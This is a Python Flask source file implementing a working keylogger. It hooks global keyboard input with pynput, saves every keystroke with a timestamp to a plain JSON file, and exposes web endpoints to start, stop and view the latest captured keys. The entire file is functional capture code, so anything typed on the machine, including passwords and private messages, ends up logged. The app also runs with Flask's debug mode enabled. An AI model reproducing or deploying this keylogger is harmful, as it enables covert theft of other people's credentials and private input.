from flask import Flask, render_template, jsonify, request
from pynput import keyboard
import json
import threading
from datetime import datetime
import os

app = Flask(__name__)

# Global state
log_file = "logs.json"
key_list = []
listener = None
is_running = False

def update_json(key_str):
    global key_list
    entry = {
        'timestamp': datetime.now().strftime('%H:%M:%S'),
        'key': key_str
    }
    key_list.append(entry)
    with open(log_file, 'w') as f:
        json.dump(key_list, f, indent=4)

def on_press(key):
    try:
        k = key.char  # standard keys
    except AttributeError:
        k = str(key)  # special keys
    update_json(k)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/status')
def get_status():
    return jsonify({"running": is_running, "logs": key_list[-20:]}) # Return last 20 keys

@app.route('/start', methods=['POST'])
def start_logging():
    global listener, is_running
    if not is_running:
        is_running = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        return jsonify({"status": "Started"})
    return jsonify({"status": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_logging():
    global listener, is_running
    if is_running:
        is_running = False
        listener.stop()
        return jsonify({"status": "Stopped"})
    return jsonify({"status": "Not running"})

if __name__ == '__main__':
    # Create empty log file if it doesn't exist
    if not os.path.exists(log_file):
        with open(log_file, 'w') as f:
            json.dump([], f)
    
    app.run(debug=True, port=5000)
